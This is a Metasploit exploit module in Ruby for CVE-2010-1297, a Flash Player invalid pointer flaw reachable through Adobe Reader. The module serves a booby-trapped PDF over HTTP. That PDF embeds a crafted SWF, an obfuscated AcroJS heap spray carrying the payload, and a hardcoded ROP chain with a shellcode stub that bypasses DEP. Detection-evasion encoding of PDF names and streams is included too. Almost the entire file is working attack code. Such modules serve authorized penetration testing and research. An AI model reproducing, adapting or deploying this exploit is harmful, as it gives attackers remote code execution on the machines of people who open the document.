##
# $Id: adobe_flashplayer_newfunction.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe Flash Player "newfunction" Invalid Pointer Use',
			'Description'    => %q{
					This module exploits a vulnerability in the DoABC tag handling within
				versions 9.x and 10.0 of Adobe Flash Player. Adobe Reader and Acrobat are also
				vulnerable, as are any other applications that may embed Flash player.

				Arbitrary code execution is achieved by embedding a specially crafted Flash
				movie into a PDF document. An AcroJS heap spray is used in order to ensure
				that the memory used by the invalid pointer issue is controlled.

				NOTE: This module uses a similar DEP bypass method to that used within the
				adobe_libtiff module. This method is unlikely to work across various
				Windows versions due a the hardcoded syscall number.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Unknown',   # Found being openly exploited
					'jduck'      # Metasploit version
				],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2010-1297'],
					['OSVDB', '65141'],
					['BID', '40586'],
					['URL', 'http://www.adobe.com/support/security/advisories/apsa10-01.html'],
					# For SWF->PDF embedding
					['URL', 'http://feliam.wordpress.com/2010/02/11/flash-on-a-pdf-with-minipdf-py/']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC'          => 'process',
					'HTTP::compression' => 'gzip',
					'HTTP::chunked'     => true,
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested OK via Adobe Reader 9.3.0 on Windows XP SP3 (uses flash 10.0.42.34) -jjd
					# Tested OK via Adobe Reader 9.3.1 on Windows XP SP3 (uses flash 10.0.45.2) -jjd
					# Tested OK via Adobe Reader 9.3.2 on Windows XP SP3 (uses flash 10.0.45.2) -jjd
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Jun 04 2010',
			'DefaultTarget'  => 0))
	end

	def exploit
		# load the static swf file
		path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2010-1297.swf" )
		fd = File.open( path, "rb" )
		@swf_data = fd.read(fd.stat.size)
		fd.close

		super
	end

	def on_request_uri(cli, request)

		print_status("Sending crafted PDF w/SWF to #{cli.peerhost}:#{cli.peerport}")

		js_data = make_js(regenerate_payload(cli).encoded)
		pdf_data = make_pdf(@swf_data, js_data)
		send_response(cli, pdf_data, { 'Content-Type' => 'application/pdf', 'Pragma' => 'no-cache' })

		# Handle the payload
		handler(cli)
	end


	def make_js(encoded_payload)

		# The following executes a ret2lib using BIB.dll
		# The effect is to bypass DEP and execute the shellcode in an indirect way
		stack_data = [
			0xc0c0c0c,
			0x7004919,      # pop ecx / pop ecx / mov [eax+0xc0],1 / pop esi / pop ebx / ret
			0xcccccccc,
			0x70048ef,      # xchg eax,esp / ret
			0x700156f,      # mov eax,[ecx+0x34] / push [ecx+0x24] / call [eax+8]
			0xcccccccc,
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009033,      # ret 0x18
			0x7009084,      # ret
			0xc0c0c0c,
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7009084,      # ret
			0x7001599,      # pop ebp / ret
			0x10124,
			0x70072f7,      # pop eax / ret
			0x10104,
			0x70015bb,      # pop ecx / ret
			0x1000,
			0x700154d,      # mov [eax], ecx / ret
			0x70015bb,      # pop ecx / ret
			0x7ffe0300,     # -- location of KiFastSystemCall
			0x7007fb2,      # mov eax, [ecx] / ret
			0x70015bb,      # pop ecx / ret
			0x10011,
			0x700a8ac,      # mov [ecx], eax / xor eax,eax / ret
			0x70015bb,      # pop ecx / ret
			0x10100,
			0x700a8ac,      # mov [ecx], eax / xor eax,eax / ret
			0x70072f7,      # pop eax / ret
			0x10011,
			0x70052e2,      # call [eax] / ret -- (KiFastSystemCall - VirtualAlloc?)
			0x7005c54,      # pop esi / add esp,0x14 / ret
			0xffffffff,
			0x10100,
			0x0,
			0x10104,
			0x1000,
			0x40,
			# The next bit effectively copies data from the interleaved stack to the memory
			# pointed to by eax
			# The data copied is:
			# \x5a\x90\x54\x90\x5a\xeb\x15\x58\x8b\x1a\x89\x18\x83\xc0\x04\x83
			# \xc2\x04\x81\xfb\x0c\x0c\x0c\x0c\x75\xee\xeb\x05\xe8\xe6\xff\xff
			# \xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xff\xff\xff\x90
			0x700d731,      # mov eax, [ebp-0x24] / ret
			0x70015bb,      # pop ecx / ret
			0x9054905a,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x5815eb5a,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x18891a8b,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x8304c083,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0xfb8104c2,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0xc0c0c0c,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x5ebee75,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0xffffe6e8,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x909090ff,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x90909090,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x90909090,
			0x700154d,      # mov [eax], ecx / ret
			0x700a722,      # add eax, 4 / ret
			0x70015bb,      # pop ecx / ret
			0x90ffffff,
			0x700154d,      # mov [eax], ecx / ret
			0x700d731,      # mov eax, [ebp-0x24] / ret
			0x700112f       # call eax -- (execute stub to transition to full shellcode)
		].pack('V*')

		var_unescape  = rand_text_alpha(rand(100) + 1)
		var_shellcode = rand_text_alpha(rand(100) + 1)

		var_start     = rand_text_alpha(rand(100) + 1)

		var_s         = 0x10000
		var_c         = rand_text_alpha(rand(100) + 1)
		var_b         = rand_text_alpha(rand(100) + 1)
		var_d         = rand_text_alpha(rand(100) + 1)
		var_3         = rand_text_alpha(rand(100) + 1)
		var_i         = rand_text_alpha(rand(100) + 1)
		var_4         = rand_text_alpha(rand(100) + 1)

		payload_buf = ''
		payload_buf << stack_data
		payload_buf << encoded_payload

		escaped_payload = Rex::Text.to_unescape(payload_buf)

		js = %Q|
var #{var_unescape} = unescape;
var #{var_shellcode} = #{var_unescape}( '#{escaped_payload}' );
var #{var_c} = #{var_unescape}( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );
while (#{var_c}.length + 20 + 8 < #{var_s}) #{var_c}+=#{var_c};
#{var_b} = #{var_c}.substring(0, (0x0c0c-0x24)/2);
#{var_b} += #{var_shellcode};
#{var_b} += #{var_c};
#{var_d} = #{var_b}.substring(0, #{var_s}/2);
while(#{var_d}.length < 0x80000) #{var_d} += #{var_d};
#{var_3} = #{var_d}.substring(0, 0x80000 - (0x1020-0x08) / 2);
var #{var_4} = new Array();
for (#{var_i}=0;#{var_i}<0x1f0;#{var_i}++) #{var_4}[#{var_i}]=#{var_3}+"s";
|

		js
	end

	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj\n" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end


	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			else
				result << c
			end
		end
		result
	end


	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end


	def make_pdf(swf, js)

		swf_name = rand_text_alpha(8 + rand(8)) + ".swf"

		xref = []
		eol = "\n"
		endobj = "endobj" << eol

		# Randomize PDF version?
		pdf = "%PDF-1.5" << eol
		#pdf << "%" << RandomNonASCIIString(4) << eol

		# catalog
		xref << pdf.length
		pdf << ioDef(1) << nObfu("<</Type/Catalog")
		pdf << nObfu("/Pages ") << ioRef(3)
		pdf << nObfu("/OpenAction ") << ioRef(5)
		pdf << nObfu(">>")
		pdf << eol << endobj

		# pages array
		xref << pdf.length
		pdf << ioDef(3) << nObfu("<</Type/Pages/Count 1/Kids [") << ioRef(4) << nObfu("]>>") << eol << endobj

		# page 1
		xref << pdf.length
		pdf << ioDef(4) << nObfu("<</Type/Page/Parent ") << ioRef(3)
		pdf << nObfu("/Annots [") << ioRef(7) << nObfu("] ")
		pdf << nObfu(">>")
		pdf << eol << endobj

		# js action
		xref << pdf.length
		pdf << ioDef(5) << nObfu("<</Type/Action/S/JavaScript/JS ") + ioRef(6) + ">>" << eol << endobj

		# js stream
		xref << pdf.length
		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
		pdf << ioDef(6) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << endobj

		# swf annotation object
		xref << pdf.length
		pdf << ioDef(7) << nObfu("<</Type/Annot/Subtype/RichMedia")
		pdf << nObfu("/Rect [20 20 187 69] ")
		pdf << nObfu("/RichMediaSettings ") << ioRef(8)
		pdf << nObfu("/RichMediaContent ") << ioRef(9)
		pdf << nObfu("/NM (") << swf_name << nObfu(")")
		pdf << nObfu(">>")
		pdf << eol << endobj

		# rich media settings
		xref << pdf.length
		pdf << ioDef(8)
		pdf << nObfu("<</Type/RichMediaSettings/Subtype/Flash")
		pdf << nObfu("/Activation ") << ioRef(10)
		pdf << nObfu("/Deactivation ") << ioRef(11)
		pdf << nObfu(">>")
		pdf << eol << endobj

		# rich media content
		xref << pdf.length
		pdf << ioDef(9)
		pdf << nObfu("<</Type/RichMediaContent")
		pdf << nObfu("/Assets ") << ioRef(12)
		pdf << nObfu("/Configurations [") << ioRef(14) << "]"
		pdf << nObfu(">>")
		pdf << eol << endobj

		# rich media activation / deactivation
		xref << pdf.length
		pdf << ioDef(10)
		pdf << nObfu("<</Type/RichMediaActivation/Condition/PO>>")
		pdf << eol << endobj

		xref << pdf.length
		pdf << ioDef(11)
		pdf << nObfu("<</Type/RichMediaDeactivation/Condition/XD>>")
		pdf << eol << endobj

		# rich media assets
		xref << pdf.length
		pdf << ioDef(12)
		pdf << nObfu("<</Names [(#{swf_name}) ") << ioRef(13) << nObfu("]>>")
		pdf << eol << endobj

		# swf embeded file ref
		xref << pdf.length
		pdf << ioDef(13)
		pdf << nObfu("<</Type/Filespec /EF <</F ") << ioRef(16) << nObfu(">> /F(#{swf_name})>>")
		pdf << eol << endobj

		# rich media configuration
		xref << pdf.length
		pdf << ioDef(14)
		pdf << nObfu("<</Type/RichMediaConfiguration/Subtype/Flash")
		pdf << nObfu("/Instances [") << ioRef(15) << nObfu("]>>")
		pdf << eol << endobj

		# rich media isntance
		xref << pdf.length
		pdf << ioDef(15)
		pdf << nObfu("<</Type/RichMediaInstance/Subtype/Flash")
		pdf << nObfu("/Asset ") << ioRef(13)
		pdf << nObfu(">>")
		pdf << eol << endobj

		# swf stream
		# NOTE: This data is already compressed, no need to compress it again...
		xref << pdf.length
		pdf << ioDef(16) << nObfu("<</Type/EmbeddedFile/Length %s>>" % swf.length) << eol
		pdf << "stream" << eol
		pdf << swf << eol
		pdf << "endstream" << eol
		pdf << endobj

		# trailing stuff
		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end

		pdf << "trailer" << eol
		pdf << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(1) << ">>" << eol

		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol

		pdf << "%%EOF" << eol
		pdf
	end

end
